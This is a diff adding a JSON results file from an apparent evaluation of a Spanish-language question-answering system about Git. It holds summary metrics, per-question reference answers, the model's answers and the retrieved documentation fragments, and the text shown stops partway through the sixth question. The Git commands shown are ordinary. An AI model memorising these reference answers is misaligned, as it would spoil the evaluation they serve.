@@ -1,0 +1,1502 @@
+{
+  "configuracion": "actual",
+  "proveedor": "ollama",
+  "modelo": "qwen2.5:14b",
+  "recall@5": 0.913,
+  "no_lo_tengo_en_sin_respuesta": "5/5",
+  "no_lo_tengo_en_con_respuesta": "1/23",
+  "salidas_bloqueadas": 0,
+  "latencia_media_s": 12.13,
+  "latencia_mediana_s": 10.1,
+  "trampa_kubernetes": {
+    "ruta": null,
+    "paso_por_responder_directo": false,
+    "respondio_no_lo_tengo": true
+  },
+  "preguntas": [
+    {
+      "id": 1,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo rehago la última confirmación si me he equivocado en el mensaje?",
+      "con_respuesta": true,
+      "referencia": "Con git commit --amend, que rehace la última confirmación.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 60.36,
+      "respuesta": "Para rehacer la última confirmación y corregir un mensaje erróneo, puedes utilizar el comando `git commit --amend`. Este comando te permitirá abrir tu editor de texto para modificar el mensaje de confirmación. Si no has realizado cambios desde tu última confirmación, este comando solo cambiará el mensaje de confirmación sin alterar la instantánea del repositorio.\n\nEjemplo:\n```\n$ git commit --amend\n```\n\nEste comando te permitirá editar el mensaje de confirmación que ya está en el editor. Puedes modificarlo según sea necesario y luego guardar los cambios para sobrescribir tu confirmación anterior [1][2].",
+      "respuesta_cruda": "Para rehacer la última confirmación y corregir un mensaje erróneo, puedes utilizar el comando `git commit --amend`. Este comando te permitirá abrir tu editor de texto para modificar el mensaje de confirmación. Si no has realizado cambios desde tu última confirmación, este comando solo cambiará el mensaje de confirmación sin alterar la instantánea del repositorio.\n\nEjemplo:\n```\n$ git commit --amend\n```\n\nEste comando te permitirá editar el mensaje de confirmación que ya está en el editor. Puedes modificarlo según sea necesario y luego guardar los cambios para sobrescribir tu confirmación anterior [1][2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Deshacer Cosas\nEn cualquier momento puede que quieras deshacer algo.\nAquí repasaremos algunas herramientas básicas usadas para deshacer cambios que hayas hecho.\nTen cuidado, a veces no es posible recuperar algo luego que lo has deshecho.\nEsta es una de las pocas áreas en las que Git puede perder parte de tu trabajo si cometes un error.  \nUno de las acciones más comunes a deshacer es cuando confirmas un cambio antes de tiempo y olvidas agregar algún archivo, o te equivocas en el mensaje de confirmación.\nSi quieres rehacer la confirmación, puedes reconfirmar con la opción `--amend`:  \n```\n$ git commit --amend\n```  \nEste comando utiliza tu área de preparación para la confirmación.",
+          "fuente": "11-git-deshacer-cambios.md",
+          "seccion": "Deshacer Cosas",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8675
+        },
+        {
+          "texto": "Deshacer Cosas\n```\n$ git commit --amend\n```  \nEste comando utiliza tu área de preparación para la confirmación.\nSi no has hecho cambios desde tu última confirmación (por ejemplo, ejecutas este comando justo después de tu confirmación anterior), entonces la instantánea lucirá exactamente igual y lo único que cambiarás será el mensaje de confirmación.  \nSe lanzará el mismo editor de confirmación, pero verás que ya incluye el mensaje de tu confirmación anterior.\nPuedes editar el mensaje como siempre y se sobreescribirá tu confirmación anterior.  \nPor ejemplo, si confirmas y luego te das cuenta que olvidaste preparar los cambios de un archivo que querías incluir en esta confirmación, puedes hacer lo siguiente:  \n```\n$ git commit -m 'initial commit'\n$ git add forgotten_file\n$ git commit --amend\n```",
+          "fuente": "11-git-deshacer-cambios.md",
+          "seccion": "Deshacer Cosas",
+          "confidencialidad": "publico",
+          "puntuacion": 0.5744
+        },
+        {
+          "texto": "Guardando cambios en el Repositorio > Confirmar tus Cambios\n# Please enter the commit message for your changes. Lines starting\n# with '#' will be ignored, and an empty message aborts the commit.\n# On branch master\n# Changes to be committed:\n#new file:   README\n#modified:   CONTRIBUTING.md\n#\n~\n~\n~\n\".git/COMMIT_EDITMSG\" 9L, 283C\n```  \nPuedes ver que el mensaje de confirmación por defecto contiene la última salida del comando `git status` comentada y una línea vacía encima de ella.\nPuedes eliminar estos comentarios y escribir tu mensaje de confirmación, o puedes dejarlos allí para ayudarte a recordar qué estás confirmando.\n(Para obtener una forma más explícita de recordar qué has modificado, puedes pasar la opción `-v` a `git commit`. Al hacerlo se incluirá en el editor el diff de tus cambios para que veas exactamente qué cambios estás confirmando).",
+          "fuente": "10-git-guardar-cambios.md",
+          "seccion": "Guardando cambios en el Repositorio > Confirmar tus Cambios",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2362
+        },
+        {
+          "texto": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios\ndel proyecto o el mensaje de confirmación antes de permitir continuar. En\nla última parte de este capítulo, veremos cómo podemos utilizar este punto\nde enganche para revisar si el mensaje de confirmación es conforme a un\ndeterminado patrón obligatorio.  \nDespués de completar todo el proceso de confirmación de cambios, es cuando\nse lanza el punto de enganche `post-commit`. Este no recibe ningún parámetro,\npero podemos obtener fácilmente la última confirmación de cambios con el\ncomando `git log -1 HEAD`. Habitualmente, este script final se suele utilizar\npara realizar notificaciones o tareas similares.",
+          "fuente": "15-git-hooks.md",
+          "seccion": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios",
+          "confidencialidad": "publico",
+          "puntuacion": 0.1126
+        },
+        {
+          "texto": "Guardando cambios en el Repositorio > Confirmar tus Cambios\nCuando sales del editor, Git crea tu confirmación con tu mensaje (eliminando el texto comentado y el diff).  \nOtra alternativa es escribir el mensaje de confirmación directamente en el comando `commit` utilizando la opción -m:  \n```\n$ git commit -m \"Story 182: Fix benchmarks for speed\"\n[master 463dc4f] Story 182: Fix benchmarks for speed\n2 files changed, 2 insertions(+)\ncreate mode 100644 README\n```  \n¡Has creado tu primera confirmación (o _commit_)!\nPuedes ver que la confirmación te devuelve una salida descriptiva: indica cuál rama has confirmado (`master`), que _checksum_ SHA-1 tiene el _commit_ (`463dc4f`), cuántos archivos han cambiado y estadísticas sobre las líneas añadidas y eliminadas en el _commit_.  \nRecuerda que la confirmación guarda una instantánea de tu área de preparación.",
+          "fuente": "10-git-guardar-cambios.md",
+          "seccion": "Guardando cambios en el Repositorio > Confirmar tus Cambios",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0823
+        }
+      ]
+    },
+    {
+      "id": 2,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo saco un archivo del área de preparación?",
+      "con_respuesta": true,
+      "referencia": "Con git reset HEAD <archivo>.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.21,
+      "respuesta": "Para sacar un archivo del área de preparación, debes usar el comando `git reset HEAD <archivo>`.\n\nPor ejemplo:\n```\n$ git reset HEAD CONTRIBUTING.md\n```\n\nEsto deshace la preparación del archivo en cuestión [5].",
+      "respuesta_cruda": "Para sacar un archivo del área de preparación, debes usar el comando `git reset HEAD <archivo>`.\n\nPor ejemplo:\n```\n$ git reset HEAD CONTRIBUTING.md\n```\n\nEsto deshace la preparación del archivo en cuestión [5].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Deshacer Cosas > Deshacer un Archivo Preparado\nLas siguientes dos secciones demuestran cómo lidiar con los cambios de tu área de preparación y tú directorio de trabajo.\nAfortunadamente, el comando que usas para determinar el estado de esas dos áreas también te recuerda cómo deshacer los cambios en ellas.\nPor ejemplo, supongamos que has cambiado dos archivos y que quieres confirmarlos como dos cambios separados, pero accidentalmente has escrito `git add *` y has preparado ambos.\n¿Cómo puedes sacar del área de preparación uno de ellos?\nEl comando `git status` te recuerda cómo:  \n```\n$ git add .\n$ git status\nOn branch master\nChanges to be committed:\n(use \"git reset HEAD <file>...\" to unstage)",
+          "fuente": "11-git-deshacer-cambios.md",
+          "seccion": "Deshacer Cosas > Deshacer un Archivo Preparado",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9698
+        },
+        {
+          "texto": "Guardando cambios en el Repositorio > Eliminar Archivos\nPara eliminar archivos de Git, debes eliminarlos de tus archivos rastreados (o mejor dicho, eliminarlos del área de preparación) y luego confirmar.\nPara ello existe el comando `git rm`, que además elimina el archivo de tu directorio de trabajo de manera que no aparezca la próxima vez como un archivo no rastreado.  \nSi simplemente eliminas el archivo de tu directorio de trabajo, aparecerá en la sección ``Changes not staged for commit'' (esto es, _sin preparar_) en la salida de `git status`:  \n```\n$ rm PROJECTS.md\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges not staged for commit:\n(use \"git add/rm <file>...\" to update what will be committed)\n(use \"git checkout -- <file>...\" to discard changes in working directory)\n\ndeleted:    PROJECTS.md",
+          "fuente": "10-git-guardar-cambios.md",
+          "seccion": "Guardando cambios en el Repositorio > Eliminar Archivos",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8597
+        },
+        {
+          "texto": "Guardando cambios en el Repositorio > Saltar el Área de Preparación\nA pesar de que puede resultar muy útil para ajustar los _commits_ tal como quieres, el área de preparación es a veces un paso más complejo de lo que necesitas para tu flujo de trabajo.\nSi quieres saltarte el área de preparación, Git te ofrece un atajo sencillo.\nAñadiendo la opción `-a` al comando `git commit` harás que Git prepare automáticamente todos los archivos rastreados antes de confirmarlos, ahorrándote el paso de `git add`:  \n```\n$ git status\nOn branch master\nChanges not staged for commit:\n(use \"git add <file>...\" to update what will be committed)\n(use \"git checkout -- <file>...\" to discard changes in working directory)\n\nmodified:   CONTRIBUTING.md",
+          "fuente": "10-git-guardar-cambios.md",
+          "seccion": "Guardando cambios en el Repositorio > Saltar el Área de Preparación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.7741
+        },
+        {
+          "texto": "Guardando cambios en el Repositorio > Eliminar Archivos\ndeleted:    PROJECTS.md\n```  \nCon la próxima confirmación, el archivo habrá desaparecido y no volverá a ser rastreado.\nSi modificaste el archivo y ya lo habías añadido al índice, tendrás que forzar su eliminación con la opción `-f`.\nEsta propiedad existe por seguridad, para prevenir que elimines accidentalmente datos que aun no han sido guardados como una instantánea y que por lo tanto no podrás recuperar luego con Git.  \nOtra cosa que puedas querer hacer es mantener el archivo en tu directorio de trabajo pero eliminarlo del área de preparación.\nEn otras palabras, quisieras mantener el archivo en tu disco duro pero sin que Git lo siga rastreando.",
+          "fuente": "10-git-guardar-cambios.md",
+          "seccion": "Guardando cambios en el Repositorio > Eliminar Archivos",
+          "confidencialidad": "publico",
+          "puntuacion": 0.6068
+        },
+        {
+          "texto": "Deshacer Cosas > Deshacer un Archivo Preparado\nrenamed:    README.md -> README\nmodified:   CONTRIBUTING.md\n```  \nJusto debajo del texto ``Changes to be committed'' (``Cambios a ser confirmados'', en inglés), verás que dice que uses `git reset HEAD <file>...` para deshacer la preparación.\nPor lo tanto, usemos el consejo para deshacer la preparación del archivo `CONTRIBUTING.md`:  \n```\n$ git reset HEAD CONTRIBUTING.md\nUnstaged changes after reset:\nMCONTRIBUTING.md\n$ git status\nOn branch master\nChanges to be committed:\n(use \"git reset HEAD <file>...\" to unstage)\n\nrenamed:    README.md -> README\n\nChanges not staged for commit:\n(use \"git add <file>...\" to update what will be committed)\n(use \"git checkout -- <file>...\" to discard changes in working directory)",
+          "fuente": "11-git-deshacer-cambios.md",
+          "seccion": "Deshacer Cosas > Deshacer un Archivo Preparado",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2242
+        }
+      ]
+    },
+    {
+      "id": 3,
+      "tipo": "factual",
+      "pregunta": "¿Qué es un fast-forward al fusionar ramas?",
+      "con_respuesta": true,
+      "referencia": "Cuando la confirmación a fusionar es accesible siguiendo directamente el historial de la otra, Git solo avanza el puntero de la rama, porque no hay trabajo divergente que combinar.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.0,
+      "respuesta": "Un avance rápido (fast forward) ocurre cuando intentas fusionar una confirmación con otra confirmación accesible siguiendo directamente el historial de la primera. Git simplifica las cosas avanzando el puntero, ya que no hay ningún otro trabajo divergente a fusionar. Esto es lo que se denomina \"avance rápido\" (fast forward).\n\n[1]",
+      "respuesta_cruda": "Un avance rápido (fast forward) ocurre cuando intentas fusionar una confirmación con otra confirmación accesible siguiendo directamente el historial de la primera. Git simplifica las cosas avanzando el puntero, ya que no hay ningún otro trabajo divergente a fusionar. Esto es lo que se denomina \"avance rápido\" (fast forward).\n\n[1]",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Procedimientos Básicos para Ramificar y Fusionar > Procedimientos Básicos de Ramificación\nEsto se hace con el comando `git merge`:  \n```\n$ git checkout master\n$ git merge hotfix\nUpdating f42c576..3a0874c\nFast-forward\nindex.html | 2 ++\n1 file changed, 2 insertions(+)\n```  \nNotarás la frase ``Fast forward'' (``Avance rápido'', en inglés) que aparece en la salida del comando.\nGit ha movido el apuntador hacia adelante, ya que la confirmación apuntada en la rama donde has fusionado estaba directamente arriba respecto a la confirmación actual.\nDicho de otro modo: cuando intentas fusionar una confirmación con otra confirmación accesible siguiendo directamente el historial de la primera; Git simplifica las cosas avanzando el puntero, ya que no hay ningún otro trabajo divergente a fusionar. Esto es lo que se denomina ``avance rápido'' (``fast forward'').",
+          "fuente": "12-git-ramas-y-fusiones.md",
+          "seccion": "Procedimientos Básicos para Ramificar y Fusionar > Procedimientos Básicos de Ramificación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9907
+        },
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganización Básica\nPor ejemplo, puedes lanzar los comandos:  \n```\n$ git checkout experiment\n$ git rebase master\nFirst, rewinding head to replay your work on top of it...\nApplying: added staged command\n```  \nHaciendo que Git vaya al ancestro común de ambas ramas (donde estás actualmente y de donde quieres reorganizar), saque las diferencias introducidas por cada confirmación en la rama donde estás, guarde esas diferencias en archivos temporales, reinicie (reset) la rama actual hasta llevarla a la misma confirmación que la rama de donde quieres reorganizar, y finalmente, vuelva a aplicar ordenadamente los cambios.  \nEn este momento, puedes volver a la rama `master` y hacer una fusión con avance rápido (fast-forward merge).  \n```\n$ git checkout master\n$ git merge experiment\n```",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganización Básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.7263
+        },
+        {
+          "texto": "Procedimientos Básicos para Ramificar y Fusionar > Procedimientos Básicos de Fusión\nGit realizará una fusión a tres bandas, utilizando las dos instantáneas apuntadas por el extremo de cada una de las ramas y por el ancestro común a ambas.  \nEn lugar de simplemente avanzar el apuntador de la rama, Git crea una nueva instantánea (snapshot) resultante de la fusión a tres bandas; y crea automáticamente una nueva confirmación de cambios (commit) que apunta a ella.\nNos referimos a este proceso como \"fusión confirmada\" y su particularidad es que tiene más de un padre.  \nVale la pena destacar el hecho de que es el propio Git quien determina automáticamente el mejor ancestro común para realizar la fusión; a diferencia de otros sistemas tales como CVS o Subversion, donde es el desarrollador quien ha de determinar cuál puede ser dicho mejor ancestro común.",
+          "fuente": "12-git-ramas-y-fusiones.md",
+          "seccion": "Procedimientos Básicos para Ramificar y Fusionar > Procedimientos Básicos de Fusión",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2333
+        },
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganización Básica\nEn casos como esos, puedes trabajar sobre una rama y luego reorganizar lo realizado en la rama `origin/master` cuando lo tengas todo listo para enviarlo al proyecto principal.\nDe esta forma, la persona que mantiene el proyecto no necesitará hacer ninguna integración con tu trabajo; le bastará con un avance rápido o una incorporación limpia.  \nCabe destacar que, la instantánea (snapshot) apuntada por la confirmación (commit) final, tanto si es producto de una reorganización (rebase) como si lo es de una fusión (merge), es exactamente la misma instantánea; lo único diferente es el historial.",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganización Básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0765
+        },
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganización Básica\nVolviendo al ejemplo anterior, en la sección sobre fusiones  puedes ver que has separado tu trabajo y realizado confirmaciones (commit) en dos ramas diferentes.  \nLa manera más sencilla de integrar ramas, tal y como hemos visto, es el comando `git merge`.\nRealiza una fusión a tres bandas entre las dos últimas instantáneas de cada rama (C3 y C4) y el ancestro común a ambas (C2); creando una nueva instantánea (snapshot) y la correspondiente confirmación (commit).  \nSin embargo, también hay otra forma de hacerlo: puedes capturar los cambios introducidos en C4 y reaplicarlos encima de C3.\nEsto es lo que en Git llamamos _reorganizar_ (_rebasing_, en inglés).\nCon el comando `git rebase`, puedes capturar todos los cambios confirmados en una rama y reaplicarlos sobre otra.",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganización Básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0416
+        }
+      ]
+    },
+    {
+      "id": 4,
+      "tipo": "factual",
+      "pregunta": "¿Cuál es la regla de oro del rebase?",
+      "con_respuesta": true,
+      "referencia": "No reorganizar nunca confirmaciones que ya se hayan enviado (push) a un repositorio público.",
+      "recall5": false,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.13,
+      "respuesta": "La regla de oro del rebase, según el contexto proporcionado, es que no debes reorganizar (rebase) confirmaciones (commits) que ya estaban disponibles públicamente y sobre las cuales otros han basado su trabajo. Si aún así es necesario hacerlo, asegúrate de que todos los involucrados ejecuten `git pull --rebase` para minimizar la frustración.\n\n[1]",
+      "respuesta_cruda": "La regla de oro del rebase, según el contexto proporcionado, es que no debes reorganizar (rebase) confirmaciones (commits) que ya estaban disponibles públicamente y sobre las cuales otros han basado su trabajo. Si aún así es necesario hacerlo, asegúrate de que todos los involucrados ejecuten `git pull --rebase` para minimizar la frustración.\n\n[1]",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganizar una Reorganización\nSi reorganizas (rebase) confirmaciones (commits) que ya estaban disponibles públicamente y la gente había basado su trabajo en ellas, entonces prepárate para tener problemas, frustrar a tu equipo y ser despreciado por tus compañeros.  \nSi tu compañero o tú ven que aun así es necesario hacerlo en algún momento, asegúrense que todos sepan que deben ejecutar `git pull --rebase` para intentar aliviar en lo posible la frustración.",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganizar una Reorganización",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0443
+        },
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganización Básica\nEn casos como esos, puedes trabajar sobre una rama y luego reorganizar lo realizado en la rama `origin/master` cuando lo tengas todo listo para enviarlo al proyecto principal.\nDe esta forma, la persona que mantiene el proyecto no necesitará hacer ninguna integración con tu trabajo; le bastará con un avance rápido o una incorporación limpia.  \nCabe destacar que, la instantánea (snapshot) apuntada por la confirmación (commit) final, tanto si es producto de una reorganización (rebase) como si lo es de una fusión (merge), es exactamente la misma instantánea; lo único diferente es el historial.",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganización Básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0213
+        },
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Algunas Reorganizaciones Interesantes\nTambién puedes aplicar una reorganización (rebase) sobre otra cosa además de sobre la rama de reorganización.\nPor ejemplo, considera un historial como el de .\nHas ramificado a una rama puntual (`server`) para añadir algunas funcionalidades al proyecto, y luego has confirmado los cambios.\nDespués, vuelves a la rama original para hacer algunos cambios en la parte cliente (rama `client`), y confirmas también esos cambios.\nPor último, vuelves sobre la rama `server` y haces algunos cambios más.  \nImagina que decides incorporar tus cambios del lado cliente sobre el proyecto principal para hacer un lanzamiento de versión; pero no quieres lanzar aún los cambios del lado servidor porque no están aún suficientemente probados.",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Algunas Reorganizaciones Interesantes",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0144
+        },
+        {
+          "texto": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Otros puntos de enganche del lado cliente\nEl punto `pre-rebase` se activa antes de cualquier reorganización y puede\nabortarla si retorna con un código de salida distinto de cero. Puedes usarlo\npara impedir reorganizaciones de cualquier confirmación de cambios ya enviada\n(push) a algún servidor.  El script de ejemplo para `pre-rebase` hace\nprecisamente eso, aunque asumiendo que `next` es el nombre de la rama\npublicada. Si lo vas a utilizar, tendrás que modificarlo para que se ajuste al\nnombre que tenga tu rama publicada.  \nEl punto de enganche `post-rewrite` se ejecuta con los comandos que reemplazan\nconfirmaciones de cambio, como `git commit --amend` y `git rebase` (pero no con\n`git filter-branch`). Su único argumento es el comando que disparará la\nreescritura, y recibe una lista de reescrituras por la entrada estándar",
+          "fuente": "15-git-hooks.md",
+          "seccion": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Otros puntos de enganche del lado cliente",
+          "confidencialidad": "publico",
+          "puntuacion": 0.009
+        },
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganización Básica\nVolviendo al ejemplo anterior, en la sección sobre fusiones  puedes ver que has separado tu trabajo y realizado confirmaciones (commit) en dos ramas diferentes.  \nLa manera más sencilla de integrar ramas, tal y como hemos visto, es el comando `git merge`.\nRealiza una fusión a tres bandas entre las dos últimas instantáneas de cada rama (C3 y C4) y el ancestro común a ambas (C2); creando una nueva instantánea (snapshot) y la correspondiente confirmación (commit).  \nSin embargo, también hay otra forma de hacerlo: puedes capturar los cambios introducidos en C4 y reaplicarlos encima de C3.\nEsto es lo que en Git llamamos _reorganizar_ (_rebasing_, en inglés).\nCon el comando `git rebase`, puedes capturar todos los cambios confirmados en una rama y reaplicarlos sobre otra.",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganización Básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0079
+        }
+      ]
+    },
+    {
+      "id": 5,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo recupero los cambios que guardé con git stash?",
+      "con_respuesta": true,
+      "referencia": "Con git stash apply.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 11.95,
+      "respuesta": "Para recuperar los cambios que has guardado con `git stash`, puedes usar el comando `git stash apply`. Este comando intentará aplicar los cambios almacenados en tu directorio de trabajo actual. Si necesitas especificar un guardado específico, puedes hacerlo usando la sintaxis `git stash apply stash@{n}`, donde `n` es el índice del guardado que deseas recuperar [5].\n\nSi quieres crear una nueva rama a partir de los cambios guardados y trabajar en ellos allí, puedes usar el comando `git stash branch <nombre-de-la-rama>`, lo cual creará la nueva rama, verificará el commit en el que estabas cuando hiciste el guardado rápido, recreará tu trabajo allí y luego eliminará el guardado si la entrada se realiza con éxito [3][4].",
+      "respuesta_cruda": "Para recuperar los cambios que has guardado con `git stash`, puedes usar el comando `git stash apply`. Este comando intentará aplicar los cambios almacenados en tu directorio de trabajo actual. Si necesitas especificar un guardado específico, puedes hacerlo usando la sintaxis `git stash apply stash@{n}`, donde `n` es el índice del guardado que deseas recuperar [5].\n\nSi quieres crear una nueva rama a partir de los cambios guardados y trabajar en ellos allí, puedes usar el comando `git stash branch <nombre-de-la-rama>`, lo cual creará la nueva rama, verificará el commit en el que estabas cuando hiciste el guardado rápido, recreará tu trabajo allí y luego eliminará el guardado si la entrada se realiza con éxito [3][4].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Guardado rápido y Limpieza > Guardando rápido tu trabajo\nTambién puedes tener archivos modificados y sin aplicar en tu directorio de trabajo cuando des entrada a un guardado – Git te da conflictos de cambinación si algo ya no se usa de manera limpia.  \nLos cambios a tus archivos fueron reaplicados, pero el archivo que tu guardaste antes no fue realmacenado.\nPara hacer eso, tienes que ejecuar el comando `git stash apply` con una opción de `--index` para decirle al comando que intente reaplicar los cambios almacenados.\nSi anteriormente lo hubieras ejecutado, lo habrías vuelto a tener en su posición original:  \n```\n$ git stash apply --index\n# On branch master\n# Changes to be committed:\n#   (use \"git reset HEAD <file>...\" to unstage)\n#\n#      modified:   index.html\n#\n# Changed but not updated:",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Guardando rápido tu trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9793
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Guardando rápido tu trabajo\nmodified:   lib/simplegit.rb\n```  \nAhora quieres cambiar de rama, pero no quieres hacer ``commit'', todavía, a lo que has estado trabajando; así que le harás un guardado rápido a los cambios.\nPara poner un nuevo guardado rápido en tus archivos, ejecuta `git stash` o `git stash save`:  \n```\n$ git stash\nSaved working directory and index state \\\n\"WIP on master: 049d078 added the index file\"\nHEAD is now at 049d078 added the index file\n(To restore them type \"git stash apply\")\n```  \nTu directorio de trabajo está limpio:  \n```\n$ git status\n# On branch master\nnothing to commit, working directory clean\n```  \nEn este punto, puedes fácilmente cambiar de ramas y hacer trabajos en otro lugar; tus cambios están guardados en tus archivos.",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Guardando rápido tu trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9557
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Creando una Rama desde un Guardado Rápido\n```\n$ git stash branch testchanges\nSwitched to a new branch \"testchanges\"\n# On branch testchanges\n# Changes to be committed:\n#   (use \"git reset HEAD <file>...\" to unstage)\n#\n#      modified:   index.html\n#\n# Changed but not updated:\n#   (use \"git add <file>...\" to update what will be committed)\n#\n#      modified:   lib/simplegit.rb\n#\nDropped refs/stash@{0} (f0dfc4d5dc332d1cee34a634182e168c4efc3359)\n```  \nEste es un buen método rápido para recuperar trabajos guardados y trabajar en una nueva rama.",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Creando una Rama desde un Guardado Rápido",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9202
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Creando una Rama desde un Guardado Rápido\nSi haces guardado rápido de algo de trabajo, lo dejas ahí por un rato y continúas en la rama de la cual hiciste guardado rápido de tu trabajo, puede que tengas problemas rehaciendo la entrada al trabajo.\nSi la entrada intenta modificar un archivo que desde entonces has modificado, tendrás un conflicto de combinación y tendrás que intentar resolverlo.\nSi quieres una forma más fácil de probar los cambios guardados de nuevo, puedes ejecutar `git stash branch`, el cual crea una nueva rama para ti, verifica el ``commit'' en el que estabas cuando hiciste guardado rápido de tu trabajo, recrea tu trabajo allí, y luego arroja el guardado rápido si la entrada se realiza con éxito:  \n```\n$ git stash branch testchanges\nSwitched to a new branch \"testchanges\"\n# On branch testchanges",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Creando una Rama desde un Guardado Rápido",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9019
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Guardando rápido tu trabajo\nPara ver qué guardados rápidos has almacenado, puedes usar `git stash list`:  \n```\n$ git stash list\nstash@{0}: WIP on master: 049d078 added the index file\nstash@{1}: WIP on master: c264051 Revert \"added file_size\"\nstash@{2}: WIP on master: 21d80a5 added number to log\n```  \nEn este caso, dos guardados fueron hechos previamente, así que tienes tres diferentes trabajos guardados.\nPuedes volver a aplicar el que acabas de guardar utilizando el comando que se muestra en la salida de ayuda del comando original: `git stash apply`.\nSi quieres hacer entrada a uno de los guardados rápidos anteriores, puedes especificarlo poniendo su nombre de esta manera: `git stash apply stash@{2}`.\nSi no especificas un guardado, Git adopta el guardado más reciente e intenta hacerle entrada:  \n```\n$ git stash apply",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Guardando rápido tu trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8942
+        }
+      ]
+    },
+    {
+      "id": 6,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo veo qué borraría git clean sin borrar nada?",
+      "con_respuesta": true,
+      "referencia": "Con git clean -n (simulación); por ejemplo git clean -n -d.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.58,
+      "respuesta": "Para ver qué archivos eliminaría `git clean` sin realmente borrarlos, puedes ejecutar el comando con la opción `-n`. Esta opción simula lo que haría el comando y muestra los archivos que serían eliminados. Por ejemplo:\n\n```\n$ git clean -d -n\nWould remove test.o\nWould remove tmp/\n```\n\nEsta salida te indica qué archivos se eliminarían si ejecutas `git clean` sin la opción `-n`. [1] [2]",
+      "respuesta_cruda": "Para ver qué archivos eliminaría `git clean` sin realmente borrarlos, puedes ejecutar el comando con la opción `-n`. Esta opción simula lo que haría el comando y muestra los archivos que serían eliminados. Por ejemplo:\n\n```\n$ git clean -d -n\nWould remove test.o\nWould remove tmp/\n```\n\nEsta salida te indica qué archivos se eliminarían si ejecutas `git clean` sin la opción `-n`. [1] [2]",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo\n```\n$ git clean -d -n\nWould remove test.o\nWould remove tmp/\n```  \nPor defecto, el comando `git clean` sólo removerá archivos que no sean controlados y que no sean ignorados. Cualquier archivo que empareje en patrón en tu `.gitignore` u otros archivos ignorados no serán removidos. Si quieres eliminar esos archivos también, como eliminar todos los `.o` generados por la versión, así puedes hacer una versión completamente limpia, puedes añadir un `-x` al comando.  \n```\n$ git status -s\nM lib/simplegit.rb\n?? build.TMP\n?? tmp/",
+          "fuente": "14-git-stash-y-clean.md",
